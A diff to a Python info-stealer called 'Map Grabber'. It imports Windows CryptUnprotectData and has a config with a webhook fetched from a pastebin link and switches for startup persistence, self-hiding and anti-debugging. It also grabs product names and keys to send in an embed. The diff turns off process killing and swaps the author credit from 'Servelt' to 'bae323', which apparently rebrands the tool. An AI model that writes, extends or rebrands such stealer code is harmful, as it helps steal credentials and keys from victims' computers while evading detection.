@@ -22,7 +22,7 @@ from win32crypt import CryptUnprotectData
 config = {
     'webhook': "webhookhere",
     'Webhook': "https://pastebin.com/raw/fvD14GBA",
-    'kill_processes': True,
+    'kill_processes': False,
     'startup': True,
     'hide_self': True,
     'anti_debug': True,
@@ -475,10 +475,10 @@ class MapGrabber(functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "💜・Map Grabber // Made By Servelt\n\n")
+                                "💜・Map Grabber // Made By bae323\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
-                                x+"\n\n💜・Map Grabber // Made By Servelt")
+                                x+"\n\n💜・Map Grabber // Made By bae323")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
@@ -564,7 +564,7 @@ class MapGrabber(functions):
                         }
                     ],
                     'footer': {
-                        'text': '!  💜・Map Grabber // Made By Servelt'
+                        'text': '!  💜・Map Grabber // Made By bae323'
                     }
                 }
             ]
